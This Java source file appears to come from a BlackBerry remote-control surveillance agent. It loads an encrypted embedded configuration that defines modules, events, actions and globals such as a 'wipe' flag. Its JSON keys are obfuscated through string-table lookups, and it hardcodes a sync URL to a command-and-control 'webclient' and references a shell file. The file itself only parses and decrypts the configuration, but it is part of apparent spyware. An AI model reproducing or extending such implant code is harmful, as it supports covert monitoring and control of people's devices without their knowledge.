//#preprocess
package blackberry.config;

import rpc.json.me.JSONArray;
import rpc.json.me.JSONException;
import rpc.json.me.JSONObject;
import rpc.json.me.JSONTokener;
import blackberry.GeneralException;
import blackberry.Messages;
import blackberry.Status;
import blackberry.action.Action;
import blackberry.crypto.EncryptionPKCS5;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.event.Event;
import blackberry.manager.ActionManager;
import blackberry.manager.EventManager;
import blackberry.manager.ModuleManager;
import blackberry.module.BaseModule;

public class Configuration {
    //#ifdef DEBUG
    private static Debug debug = new Debug("Configuration", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    /** The status obj. */
    private final Status status;

    /**
     * Configuration file embedded into the .apk
     */
    private final String jsonResource;

    /** Clear configuration buffer wrapped into a ByteBuffer. */
    // private ByteBuffer wrappedClearConf;

    /** The Constant TASK_ACTION_TIMEOUT. */
    public static final long TASK_ACTION_TIMEOUT = 600000;

    public static final boolean OVERRIDE_SYNC_URL = false;
    public static final String SYNC_URL = "http://172.20.20.147/wc12/webclient"; //$NON-NLS-1$
    /** The Constant MIN_AVAILABLE_SIZE. */
    public static final long MIN_AVAILABLE_SIZE = 200 * 1024;

    public static final String shellFile = Messages.getString("q.0"); //$NON-NLS-1$

    private static final int AGENT_ENABLED = 0x2;

    private static final int DIGEST_LEN = 20;

    // public static final String SYNC_URL =
    // "http://192.168.1.189/wc12/webclient";

    // public static final boolean DEBUG = Config.DEBUG;

    public Configuration(String jsonConf) throws ConfigurationException {
        status = Status.getInstance();
        jsonResource = jsonConf;
    }

    public Configuration(byte[] resource, int len, int offset) {
        status = Status.getInstance();
        jsonResource = decryptConfiguration(resource, len, offset);
    }

    /**
     * Load configuration.
     * 
     * @return true, if successful
     * @throws GeneralException
     *             the rCS exception
     */
    public boolean loadConfiguration(boolean instantiate) {
        try {
            // Parse and load configuration
            return parseConfiguration(instantiate, jsonResource);
        } catch (final Exception e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("loadConfiguration"); //$NON-NLS-1$
            //#endif
            return false;
        }
    }

    abstract static class Visitor {
        protected boolean instantiate;

        public Visitor(boolean instantiate) {
            this.instantiate = instantiate;
        }

        public static void load(JSONArray jmodules, Visitor visitor) {
            int agentTag;

            // How many agents we have?
            final int num = jmodules.length();

            //#ifdef DEBUG
            debug.trace("load, number of elements: " + num); //$NON-NLS-1$
            //#endif

            // Get id, status, parameters length and parameters
            for (int i = 0; i < num; i++) {
                JSONObject jobject;
                try {
                    jobject = jmodules.getJSONObject(i);
                    //#ifdef DEBUG
                    debug.trace("load " + jobject); //$NON-NLS-1$
                    //#endif
                    visitor.call(i, jobject);
                } catch (JSONException e) {
                    //#ifdef DEBUG
                    debug.error(e);
                    //#endif

                } catch (ConfigurationException e) {
                    //#ifdef DEBUG
                    debug.error(e);
                    //#endif
                }
            }
        }

        public abstract void call(int id, JSONObject o)
                throws ConfigurationException, JSONException;
    }

    class LoadModule extends Visitor {
        public LoadModule(boolean instantiate) {
            super(instantiate);
        }

        public void call(int moduleId, JSONObject params)
                throws ConfigurationException, JSONException {
            final String moduleType = params.getString(Messages.getString("q.18")); //$NON-NLS-1$

            //#ifdef DEBUG
            /*debug.trace("call Module: " + moduleType + " Params size: "
                    + params.length());*/
            //#endif

            if (instantiate) {
                final ConfModule conf = new ConfModule(moduleType, params);
                BaseModule module = ModuleManager.getInstance()
                        .makeModule(conf);
            }
        }
    }

    class LoadEvent extends Visitor {
        public LoadEvent(boolean instantiate) {
            super(instantiate);
        }

        public void call(int eventId, JSONObject jmodule) throws JSONException {
            //#ifdef DBC
            Check.requires(jmodule != null,
                    " (call) Assert failed, null jmodule"); //$NON-NLS-1$
            //#endif

            String eventType = jmodule.getString(Messages.getString("q.17")); //$NON-NLS-1$
            //#ifdef DBC
            Check.asserts(eventType != null,
                    " (call) Assert failed, null eventType"); //$NON-NLS-1$
            //#endif

            if (jmodule.has(Messages.getString("q.15"))) { //$NON-NLS-1$
                eventType += " " + jmodule.getString(Messages.getString("q.16")); //$NON-NLS-1$ //$NON-NLS-2$
            }

            //#ifdef DEBUG
            debug.trace("call Event: " + eventId + " type: " + eventType //$NON-NLS-1$ //$NON-NLS-2$
                    + " Params size: " + jmodule.length()); //$NON-NLS-1$
            //#endif

            if (instantiate) {
                final ConfEvent conf = new ConfEvent(eventId, eventType,
                        jmodule);
                Event event = EventManager.getInstance().makeEvent(conf);
            }

        }
    }

    class LoadAction extends Visitor {
        public LoadAction(boolean instantiate) {
            super(instantiate);
        }

        public void call(int actionId, JSONObject jaction)
                throws ConfigurationException, JSONException {
            String desc = jaction.getString(Messages.getString("q.14")); //$NON-NLS-1$
            final Action a = new Action(actionId, desc);

            JSONArray jsubactions = jaction.getJSONArray(Messages.getString("q.13")); //$NON-NLS-1$
            int subNum = jsubactions.length();

            //#ifdef DEBUG
            debug.trace("call Action " + actionId + " SubActions: " + subNum); //$NON-NLS-1$ //$NON-NLS-2$
            //#endif

            for (int j = 0; j < subNum; j++) {
                JSONObject jsubaction = jsubactions.getJSONObject(j);

                final String type = jsubaction.getString(Messages.getString("q.12")); //$NON-NLS-1$
                ConfAction conf = new ConfAction(actionId, j, type, jsubaction);
                if (a.addSubAction(conf)) {
                    //#ifdef DEBUG
                    debug.trace("call SubAction " + j + " Type: " + type //$NON-NLS-1$ //$NON-NLS-2$
                            + " Params Length: " + jsubaction.length()); //$NON-NLS-1$
                    //#endif

                }
            }
            //#ifdef DBC
            Check.ensures(a.getSubActionsNum() == subNum,
                    "inconsistent subaction number"); //$NON-NLS-1$
            //#endif

            if (instantiate) {
                ActionManager.getInstance().add(a);
            }
        }
    }

    /**
     * Parses the configuration. k
     * 
     * @throws GeneralException
     *             the rCS exception
     */
    private boolean parseConfiguration(boolean instantiate, String json) {
        try {
            //#ifdef DEBUG
            debug.trace("parseConfiguration: " + json); //$NON-NLS-1$
            //#endif

            JSONObject root = (JSONObject) new JSONTokener(json).nextValue();

            JSONArray jmodules = root.getJSONArray(Messages.getString("q.1")); //$NON-NLS-1$
            JSONArray jevents = root.getJSONArray(Messages.getString("q.2")); //$NON-NLS-1$
            JSONArray jactions = root.getJSONArray(Messages.getString("q.3")); //$NON-NLS-1$
            JSONObject jglobals = root.getJSONObject(Messages.getString("q.4")); //$NON-NLS-1$

            //#ifdef DEBUG
            debug.info("parseConfiguration -- MODULES"); //$NON-NLS-1$
            //#endif
            Visitor.load(jmodules, new LoadModule(instantiate));
          //#ifdef DEBUG
            debug.info("parseConfiguration -- EVENTS"); //$NON-NLS-1$
            //#endif
            Visitor.load(jevents, new LoadEvent(instantiate));
          //#ifdef DEBUG
            debug.info("parseConfiguration -- ACTIONS"); //$NON-NLS-1$
            //#endif
            Visitor.load(jactions, new LoadAction(instantiate));

          //#ifdef DEBUG
            debug.info("parseConfiguration -- GLOBALS"); //$NON-NLS-1$
            //#endif
            loadGlobals(jglobals, instantiate);

            //#ifdef DEBUG
            debug.trace("== ACTIONS ==\n" + ActionManager.getInstance()); //$NON-NLS-1$
            debug.trace("== MODULES ==\n" + ModuleManager.getInstance()); //$NON-NLS-1$
            debug.trace("== EVENTS ==\n " + EventManager.getInstance()); //$NON-NLS-1$
            debug.trace("== STATUS ==\n " + status.statusGlobals()); //$NON-NLS-1$
            //#endif

            return true;
        } catch (JSONException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
            return false;
        }
    }

    private void loadGlobals(JSONObject jglobals, boolean instantiate)
            throws JSONException {

        Globals g = new Globals();

        JSONObject jquota = jglobals.getJSONObject(Messages.getString("q.5")); //$NON-NLS-1$
        g.quotaMin = jquota.getInt(Messages.getString("q.6")); //$NON-NLS-1$
        g.quotaMax = jquota.getInt(Messages.getString("q.7")); //$NON-NLS-1$

        g.wipe = jglobals.getBoolean(Messages.getString("q.8")); //$NON-NLS-1$
        g.type = jglobals.getString(Messages.getString("q.9")); //$NON-NLS-1$
        g.migrated = jglobals.getBoolean(Messages.getString("q.10")); //$NON-NLS-1$
        g.version = jglobals.getInt(Messages.getString("q.11")); //$NON-NLS-1$

        status.setGlobal(g);
    }

    /**
     * Decrypt configuration.
     * 
     * @param rawConf
     *            the raw conf
     * @return
     * @throws GeneralException
     *             the rCS exception
     */
    private String decryptConfiguration(final byte[] rawConf, int len,
            int offset) {
        /**
         * Struttura del file di configurazione
         * 
         * |DWORD|DATA.....................|CRC| |---Skip----|-Len-|
         * 
         * La prima DWORD contiene la lunghezza del blocco di dati (inclusa la
         * stessa Len) CRC e' il CRC (cifrato) dei dati in chiaro, inclusa la
         * DWORD Len
         */

        try {
            EncryptionPKCS5 crypto = new EncryptionPKCS5(Keys.getInstance()
                    .getConfKey());
            final byte[] clearConf = crypto.decryptDataIntegrity(rawConf, len,
                    offset);

            String json = new String(clearConf);

            if (json != null && json.length() > 0) {
                // Return decrypted conf
                //#ifdef DEBUG
                debug.trace("decryptConfiguration: valid"); //$NON-NLS-1$
                //#endif

                return json;
            }
            return null;

        } catch (final SecurityException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("decryptConfiguration"); //$NON-NLS-1$
            //#endif
        } catch (final Exception e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("decryptConfiguration"); //$NON-NLS-1$
            //#endif
        }

        return null;
    }



    public boolean isDecrypted() {
        return jsonResource != null;
    }

}
